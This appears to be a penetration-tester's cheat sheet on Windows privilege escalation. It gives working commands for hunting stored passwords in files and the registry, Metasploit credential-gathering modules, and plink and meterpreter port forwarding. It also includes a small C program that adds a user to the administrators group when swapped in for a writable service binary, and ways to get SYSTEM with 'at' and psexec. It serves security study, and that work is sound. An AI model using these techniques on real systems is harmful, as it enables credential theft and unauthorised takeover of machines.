
## Processes running

```
# The cronjob of windows
schtasks /query /fo LIST /v

# Running services
tasklist /SVC
net start

# Running processes
tasklist /v



# List all drivers
driverquery
```

## Users and domain

```
net users
net localgroups

# View Domain Groups
net group /domain

# View Members of Domain Group
net group /domain <Group Name>
```

### List all patches

```
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

## References

http://www.fuzzysecurity.com/tutorials/16.html


# Privilege escalation windows

Look for vulnerable services that may be running as system

There are usually three types of users on a windows machine:

1. System
2. Administrator
3. Regular user

The process can be automatd with the windows-priv-esc checker.
http://pentestmonkey.net/tools/windows-privesc-check

If you are admin you can use this tool to get SYSTEM.
https://technet.microsoft.com/en-us/sysinternals/bb897553

## Metasploit - The easy way

So if you have a metasploit meterpreter session going you can run **getsystem**.

### Post modules

First you need to background the meterpreter shell and then you just run the post modules.
You can also try some different post modules. 

```
use exploit/windows/local/service_permissions

post/windows/gather/credentials/gpp

exploit/windows/local/trusted_service_path

run post/windows/gather/credential_collector 

run post/multi/recon/local_exploit_suggester

run post/windows/gather/enum_shares

run post/windows/gather/enum_snmp

run post/windows/gather/enum_applications

run post/windows/gather/enum_logged_on_users

run post/windows/gather/checkvm 
```


## Manually

### Basic Enumeration of the System

Before we start looking for privilege escalation opportunities we need to understand a bit about the machine.



```
systeminfo
hostname

#Who am I?
whoami
echo %username%

# What users are on the machine?
net users

# More info about a specific user
net user user1

# Firewall
netsh firewall show state
netsh firewall show config

# Network
ipconfig /all
route print
arp -A
```

Even the manual way can be speeded up. Using this awesome script (wmic_info.bat). Found here: http://www.fuzzysecurity.com/tutorials/16.html 

### Cleartext passwords

Can be find like this:

```
findstr /si password *.txt
findstr /si password *.xml
findstr /si password *.ini

#Find all those strings in config files.
dir /s *pass* == *cred* == *vnc* == *.config*

# Find all pass in all files.
findstr /spin "password" *.*
findstr /spin "password" *.*
```

These are common files to find them in. They might be base64-encoded. So look out for that. 

**In files**
```
c:\sysprep.inf
c:\sysprep\sysprep.xml
c:\unattend.xml
%WINDIR%\Panther\Unattend\Unattended.xml
%WINDIR%\Panther\Unattended.xml

dir c:\*vnc.ini /s /b
dir c:\*ultravnc.ini /s /b 
dir c:\ /s /b | findstr /si *vnc.ini
```

**In registry**
```
# VNC
reg query "HKCU\Software\ORL\WinVNC3\Password"

# Windows autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

# SNMP Paramters
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"

# Putty
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

# Search for password in registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

**Group Policy Preference**
If the machine belongs to a domain and your user has access to "System Volume Information" there might be some sensitive files there.

Look for the file **Groups.xml**. It might be encrpted the password. But the encryption.key can be found on windows homepage. Other interesting files here might be

```
Services\Services.xml: Element-Specific Attributes
ScheduledTasks\ScheduledTasks.xml: Task Inner Element, TaskV2 Inner Element, ImmediateTaskV2 Inner Element
Printers\Printers.xml: SharedPrinter Element
Drives\Drives.xml: Element-Specific Attributes
DataSources\DataSources.xml: Element-Specific Attributes
```

### Internal services

Sometimes there are services that are only accessible from inside the network. For example a MySQL server might not be accessible from the outside, for security reasons. It is also common to have different administration applications that is only accessible for the target. Like a printer interface, or something like that. These services might be more vulnerable since they are not meant to be seen from the outside.

So basically run 

```
netstat -ano
```

And look for LISTENING. Then you compare that to the scan you did from the outside.
Does it contain any ports that are not accessible from the outside?

If that is the case, maybe you can make a remote forward to access it.

```
# Port forward using plink
plink.exe -l root -pw mysecretpassword 192.168.0.101 -R 8080:127.0.0.1:8080

# Port forward using meterpreter
portfwd add -l <attacker port> -p <victim port> -r <victim ip>
portfwd add -l 3306 -p 3306 -r 192.168.222
```

So how should we interpret the netstat output?

```
Proto  Local address      Remote address     State        User  Inode  PID/Program name
    -----  -------------      --------------     -----        ----  -----  ----------------
    tcp    0.0.0.0:21         0.0.0.0:*          LISTEN       0     0      -
    tcp    0.0.0.0:5900       0.0.0.0:*          LISTEN       0     0      -
    tcp    0.0.0.0:6532       0.0.0.0:*          LISTEN       0     0      -
    tcp    192.168.1.9:139    0.0.0.0:*          LISTEN       0     0      -
    tcp    192.168.1.9:139    192.168.1.9:32874  TIME_WAIT    0     0      -
    tcp    192.168.1.9:445    192.168.1.9:40648  ESTABLISHED  0     0      -
    tcp    192.168.1.9:1166   192.168.1.9:139    TIME_WAIT    0     0      -
    tcp    192.168.1.9:27900  0.0.0.0:*          LISTEN       0     0      -
    tcp    127.0.0.1:445      127.0.0.1:1159     ESTABLISHED  0     0      -
    tcp    127.0.0.1:27900    0.0.0.0:*          LISTEN       0     0      -
    udp    0.0.0.0:135        0.0.0.0:*                       0     0      -
    udp    192.168.1.9:500    0.0.0.0:*                       0     0      -
```

**Local address 0.0.0.0**
Local address 0.0.0.0 means that the service is listening on all interfaces. This means that it can receive a connection from the network card, from the loopback interface or any other interface. This means that anyone can connect to it.

**Local address 127.0.0.1**
Local address 127.0.0.1 means that the service is only listening for connection from the your PC. Not from the internet or anywhere else. This is interesting to us!

**192.168.1.9**
Local address 192.168.1.9 means that the service is only listening for connections from the local network. So someone in the local network can connect to it, but not someone from the internet. This is also interesting to us!


### Kernel exploits

Just as in windows kernel exploits should be our last resource, since it might but the machine in an unstable state or create some other problem with the machine. 

1. Step one - Identify the hotfixes/patches

```
wmic qfe get Caption,Description,HotFixID,InstalledOn
```


#### Python to binary

If we have an exploit written in python but we don't have python installed on the victim-machine we can always transform it into a binary with pyinstaller. Good trick to know.

### Schedualed tasks

Here we are looking for tasks that are run with by a priviliged user, and run a binary that we can overwrite.

```
schtasks /query /fo LIST /v
```

This might produce a huge amount of text. I have not been able to figure out how to just output the relevant strings with findstr. So if you know a better way please notify me. As for now I just copy-paste the text and past it into my linux-terminal and run.

Yeah I know this ain't pretty, but it works. You can of course change the name SYSTEM to another priviliged user.

```
cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
```

### Weak service permissions

Services on windows are programs that run in the background. Without a GUI.

If you find a service that has read-write permissions set to everyone you can just change that binary into a binary that adds a user to the administrators group and thereby giving it privileges.

First we need to find services. That can be done using **wmci**. Wmci is not availbe on all windows machines, and it might not be avaliable to your user. If you don't have access to it, there is a workaround using sc.exe. See further down. But if wmci is availible, you can use it like this.


#### WMCI

```
wmic service list brief
```

This will produce a lot out output and we need to know which one of all of these services have weak permissions. In order to check that we can use the icalcs program. Notice that icalcs is only available from Vista and up. XP has calcs instead.

As you can see in the command you need to make sure that you have access to wimc, icalcs and write privilege in windows\temp.

```
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> c:\windows\temp\permissions.txt

for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls "%a"
```

##### SC.exe

```
sc query state= all | findstr "SERVICE_NAME:" >> Servicenames.txt

FOR /F %i in (Servicenames.txt) DO echo %i
type Servicenames.txt

FOR /F "tokens=2 delims= " %i in (Servicenames.txt) DO @echo %i >> services.txt

FOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> path.txt
```

Now you can process them one by one with the cacls command.

```
cacls "C:\path\to\file.exe"
```

Binaries in system32 are excluded sine they are mostly correct, since they are installed by windows. What we are interested in is binaries that have been installed by the user.In the output you want to look for **BUILTIN\Users:(F)**.

```
C:\path\to\file.exe BUILTIN\Users:F
BUILTIN\Power Users:C 
BUILTIN\Administrators:F 
NT AUTHORITY\SYSTEM:F 
```

http://chairofforgetfulness.blogspot.cl/2014/01/better-together-scexe-and.html

That means your user has write access. So you can just rename the .exe file and add your own. And then restart the program and your program will be exevuted instead. This can be a simple getsuid program or a reverse shell that you create with msfvenom.


Here is a POC code for getsuid.

```c
#include <stdlib.h>
int main ()
{
int i;
i=system ("net localgroup administrators theusername /add");
return 0;
}
```

We then compile it with out cross-compiler, if you are on linux, like this:

```
i686-w64-mingw32-gcc windows-exp.c -lws2_32 -o exp.exe
```

rever-shell with msfvenom.

Okay, so now that we have either create our setuid or our reverse shell we need to restart the program, we can do that using wmci. Like this

```
wmic service NAMEOFSERVICE call startservice
```

If your meterpreter session dies you need to remember to first migrate it to a more stable service. A common service to migrate to is winlogon.exe since it is run by system and it is always run. You can find the PID like this

```
wmic process list brief | find "winlogon"
```

So when you get the shell you can either type **migrate PID** or automate this so that meterpreter automatically migrates.  


### Unquoted Service Paths

This attack is explained here:
http://toshellandback.com/2015/11/24/ms-priv-esc/

There is also a metasploit module for this is: exploit/windows/local/trusted_service_path


### Vulnerable Services

#### Service Binaries

#### Windows Services


### AlwaysInstallElevated

```
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
```

http://toshellandback.com/2015/11/24/ms-priv-esc/

### Unattended Installs

### Get SYSTEM user from a user with Administrator privilieges.

#### On windows XP

If you have a GUI with a user that is included in Administrators group you first need to open up a cmd.exe for the administrator. If you open up the cmd that is in Accessories it will be opened up as a normal user. And if you rightclik and do Run as administrator you might need to know the Administrators password. Which you might not know. So instead you open up the cmd from c:\windows\system32\cmd.exe. This will give you a cmd with Administratos rights.

From here we want to become SYSTEM user. To do this we run:

First we check what time it is on the local machine:

```
time

# Now we set the time we want the system CMD to start. Probably one minuter after the time.

at 01:23 /interactive cmd.exe
```

And then the cmd with SYSTEM privs pops up.

#### Vista and up

You first need to upload PsExec.exe anad then you run:

```
psexec -i -s cmd.exe
```

Most recommended article

http://travisaltman.com/windows-privilege-escalation-via-weak-service-permissions/
http://www.fuzzysecurity.com/tutorials/16.html

https://www.offensive-security.com/metasploit-unleashed/privilege-escalation/

http://it-ovid.blogspot.cl/2012/02/windows-privilege-escalation.html

https://github.com/gentilkiwi/mimikatz

http://bernardodamele.blogspot.cl/2011/12/dump-windows-password-hashes.html

https://www.youtube.com/watch?v=kMG8IsCohHA&feature=youtu.be

https://www.youtube.com/watch?v=PC_iMqiuIRQ

http://www.harmj0y.net/blog/powershell/powerup-a-usage-guide/

https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp

http://pwnwiki.io/#!privesc/windows/index.md

